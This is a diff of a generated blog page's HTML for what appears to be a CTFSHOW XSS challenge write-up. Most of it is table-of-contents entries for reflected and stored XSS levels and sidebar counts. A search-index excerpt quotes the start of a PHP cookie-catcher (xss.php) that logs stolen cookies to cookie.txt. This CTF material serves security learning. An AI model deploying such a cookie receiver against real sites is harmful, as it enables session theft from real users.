href="#WEB323-326"><span class="toc-number">1.8.</span> <span class="toc-text">WEB323-326</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%82%A8%E5%AD%98%E5%9E%8Bxss"><span class="toc-number">2.</span> <span class="toc-text">储存型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB327-%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text">WEB327(无过滤)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB328"><span class="toc-number">2.2.</span> <span class="toc-text">WEB328</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB329"><span class="toc-number">2.3.</span> <span class="toc-text">WEB329</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB330"><span class="toc-number">2.4.</span> <span class="toc-text">WEB330</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB331"><span class="toc-number">2.5.</span> <span class="toc-text">WEB331</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB332"><span class="toc-number">2.6.</span> <span class="toc-text">WEB332</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB333"><span class="toc-number">2.7.</span> <span class="toc-text">WEB333</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-number">1.</span> <span class="toc-text"> 反射型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web316%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text"> WEB316(无过滤)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web317%E8%BF%87%E6%BB%A4script"><span class="toc-number">1.2.</span> <span class="toc-text"> WEB317(过滤script)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web318%E8%BF%87%E6%BB%A4scriptimg"><span class="toc-number">1.3.</span> <span class="toc-text"> WEB318(过滤script\img)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web319"><span class="toc-number">1.4.</span> <span class="toc-text"> WEB319</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web320%E8%BF%87%E6%BB%A4scriptimg%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.5.</span> <span class="toc-text"> WEB320(过滤script\img\空格)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web321"><span class="toc-number">1.6.</span> <span class="toc-text"> WEB321</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web322%E9%99%A4%E4%BA%86%E4%BB%A5%E4%B8%8A%E8%BF%98%E8%BF%87%E6%BB%A4xss"><span class="toc-number">1.7.</span> <span class="toc-text"> WEB322(除了以上还过滤xss)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web323-326"><span class="toc-number">1.8.</span> <span class="toc-text"> WEB323-326</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%82%A8%E5%AD%98%E5%9E%8Bxss"><span class="toc-number">2.</span> <span class="toc-text"> 储存型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web327%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text"> WEB327(无过滤)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web328"><span class="toc-number">2.2.</span> <span class="toc-text"> WEB328</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web329"><span class="toc-number">2.3.</span> <span class="toc-text"> WEB329</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web330"><span class="toc-number">2.4.</span> <span class="toc-text"> WEB330</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web331"><span class="toc-number">2.5.</span> <span class="toc-text"> WEB331</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web332"><span class="toc-number">2.6.</span> <span class="toc-text"> WEB332</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web333"><span class="toc-number">2.7.</span> <span class="toc-text"> WEB333</span></a></li></ol></li></ol>
       
   </div>
 </div>
@@ -556,7 +557,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">26</div>
+    <div class="sidebar-state-number">38</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -564,7 +565,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">16</div>
+    <div class="sidebar-state-number">18</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -689,7 +690,7 @@
           url: "http://example.com/2025/02/19/CTFSHOW-XSS/",
           excerpt: "",
           description: "",
-          stripContent: "反射型xssWEB316(无过滤)在服务器上放一个接受cookie的文件xss.php 1234567&amp;lt;?php $cookie = $_GET[&amp;#x27;cookie&amp;#x27;]; $time = date(&amp;#x27;Y-m-d h:i:s&amp;#x27;, time()); $log = fopen(&amp;quot;cookie.txt&amp;quot;, &amp;quot;a&amp;quot;); fwrite($log,$time.&amp;#x27;:    &amp;#x27;. $cookie . &amp;quot;",
+          stripContent: " 反射型xss  WEB316(无过滤) 在服务器上放一个接受cookie的文件xss.php 1234567&amp;lt;?php $cookie = $_GET[&amp;#x27;cookie&amp;#x27;]; $time = date(&amp;#x27;Y-m-d h:i:s&amp;#x27;, time()); $log = fopen(&amp;quot;cookie.txt&amp;quot;, &amp;quot;a&amp;quot;); fwrite($log,$time.&amp;#x27;:    &amp;#x27;. $cookie . &amp;q",
           date: "Wed Feb 19 2025 13:30:13 GMT+0800",
           updated: "Sun Feb 23 2025 16:02:13 GMT+0800",
           cover: "/../images/17373827994914.jpg",
